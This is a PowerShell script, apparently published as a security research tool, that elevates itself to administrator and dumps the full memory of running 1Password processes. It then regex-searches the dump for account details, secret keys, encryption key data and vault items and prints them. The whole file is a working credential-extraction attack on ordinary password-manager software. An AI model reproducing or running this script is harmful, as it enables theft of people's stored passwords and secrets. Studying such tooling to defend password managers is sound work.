<#
.SYNOPSIS
    Exfiltrates 1Password secrets by performing a memory dump
.DESCRIPTION
    The 1Password password manager client keeps a lot of sensitive information in memory, such as credentials or any other type of document saved within the database.
.NOTES
    Author:  Tiziano Marra (https://github.com/MrTiz)
    Date:    2022-09-17
    Version: 1.0
#>

function CheckIfRunAsAdministrator() {
    $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())

    if (-Not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    	$ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo 'PowerShell';
        $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
        $ElevatedProcess.Verb = 'runas'

        [System.Diagnostics.Process]::Start($ElevatedProcess)
        Exit
    }
}

#Forked from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
function Out-Minidump {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)][System.Diagnostics.Process]$Process,
        [Parameter(Mandatory = $True)][ValidateScript({ Test-Path $_ })][String]$DumpFilePath
    )

    BEGIN {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle

        $FileStream = New-Object IO.FileStream($DumpFilePath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-Not $Result) {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            Remove-Item -Path $DumpFilePath -Force -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
    }

    END {}
}

function MakeTMPFile() {
    $TmpFile = New-TemporaryFile | Select-Object -ExpandProperty FullName
    $File = [System.IO.Path]::ChangeExtension($TmpFile, '.dmp')
    Rename-Item -Path $TmpFile -NewName $File -Force

    (Get-Item -Path $File).Encrypt()

    $Acl = Get-Acl -Path $File

    $Owner            = New-Object System.Security.Principal.Ntaccount('NT AUTHORITY\SYSTEM')
    $SystemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule('NT AUTHORITY\SYSTEM',    'FullControl', 'Allow')
    $AdminAccessRule  = New-Object System.Security.AccessControl.FileSystemAccessRule('BUILTIN\Administrators', 'FullControl', 'Allow')

    $Acl.SetOwner($Owner)
    $Acl.SetAccessRuleProtection($True, $False)
    $Acl.SetAccessRule($SystemAccessRule)
    $Acl.SetAccessRule($AdminAccessRule)

    Set-Acl -Path $File -AclObject $Acl

    return $File
}

CheckIfRunAsAdministrator
$File = MakeTMPFile

$Processes = Get-Process -Name '1Password'
$Patterns = @(
    '\{"account_state":"\w","account_template_version":\d+,"account_type":"\w","account_version":\d+,"base_attachment_url":".+?","base_avatar_url":".+?","secret_key":".+?\}\}',
    '\{"type":"Success","content":\{"callbackId":\d+,"response":\{"type":"NmRequestAccounts","content":\{"accounts":\[\{"type":"Unlocked","content":\{"details":\{"accountUuid":".+?\}\}\}\}',
    '\{"title":".+?"key_ops":\["encrypt","decrypt"\]\}\}\}\}',
    '\{"ps":[ -~]+?\}\0',
    '\{"sections":\[\{"[ -~]+\}'
)

$Pattern = "($($Patterns -Join '|'))"

foreach ($Process in $Processes) {
	Out-Minidump -Process $Process -DumpFilePath $File

    Select-String -Path $File -Pattern $Pattern -AllMatches | 
        ForEach-Object { 
            $_.Matches
        } | 
        ForEach-Object { 
            Write-Host "$($_.Value)`n"
        }
}

Remove-Item -Path $File -Force
